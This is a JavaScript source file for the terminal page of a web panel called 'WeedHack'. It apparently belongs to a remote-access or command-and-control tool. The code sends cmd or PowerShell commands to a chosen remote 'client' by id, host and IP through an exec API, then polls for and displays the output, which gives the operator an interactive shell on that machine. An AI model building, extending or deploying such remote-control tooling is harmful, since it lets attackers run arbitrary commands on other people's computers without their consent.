// language: JavaScript, file: public/js/cmd.js
const $ = (id) => document.getElementById(id);
const params = new URLSearchParams(location.search);

const clientId = Number(params.get('id'));
let shell = (params.get('shell') || 'cmd').toLowerCase();
if (!['cmd', 'powershell'].includes(shell)) shell = 'cmd';

const target = params.get('host') || `client ${clientId}`;
const ip = params.get('ip') || '';

let lastSeenId = 0;
let timer = null;

function paintChrome() {
  $('bar-shell').textContent = shell;
  $('bar-target').textContent = `${target} @ ${ip}`;
  $('ps1').textContent = shell === 'powershell' ? 'PS>' : 'C:\\>';
  document.title = `WeedHack — ${shell} — ${target}`;
}

function stamp() {
  const d = new Date();
  const p = (n) => String(n).padStart(2, '0');
  return `${p(d.getHours())}:${p(d.getMinutes())}:${p(d.getSeconds())}`;
}

function write(text, cls) {
  const el = document.createElement('div');
  el.className = 'line' + (cls ? ' ' + cls : '');
  el.textContent = text;
  $('term').appendChild(el);
  $('term').scrollTop = $('term').scrollHeight;
}

const meta = (t) => write(`[${stamp()}] ${t}`, 'meta');

async function send(line) {
  if (!line.trim()) return;
  write(`${shell === 'powershell' ? 'PS>' : 'C:\\>'} ${line}`, 'in');
  try {
    const r = await fetch(`/api/clients/${clientId}/exec`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ shell, line }),
    });
    const d = await r.json().catch(() => ({}));
    if (!r.ok) { write(`send failed: ${d.error || r.status}`, 'err'); return; }
    schedule();
  } catch {
    write('network error', 'err');
  }
}

async function poll() {
  if (!clientId) return;
  try {
    const r = await fetch(`/api/clients/${clientId}/commands`);
    if (!r.ok) return;
    const rows = await r.json();
    const asc = rows.slice().reverse();
    for (const row of asc) {
      if (row.id <= lastSeenId) continue;
      lastSeenId = row.id;
      if (row.shell !== shell) continue;
      if (row.status === 'pending' || row.status === 'sent') {
        meta(`${shell} → ${row.line}  [sent]`);
        continue;
      }
      if (row.status === 'done') {
        write(`${shell === 'powershell' ? 'PS>' : 'C:\\>'} ${row.line}`, 'in');
        write(row.output || '(no output)');
      }
    }
  } catch {}
}

function schedule() {
  clearTimeout(timer);
  timer = setTimeout(poll, 800);
}

$('cmdline').addEventListener('keydown', (e) => {
  if (e.key === 'Enter') {
    const v = $('cmdline').value;
    $('cmdline').value = '';
    send(v);
  }
});

paintChrome();
meta(`attached to ${target} @ ${ip}`);
meta(`shell = ${shell}`);
meta('type a command and press enter');
setInterval(poll, 2000);
poll();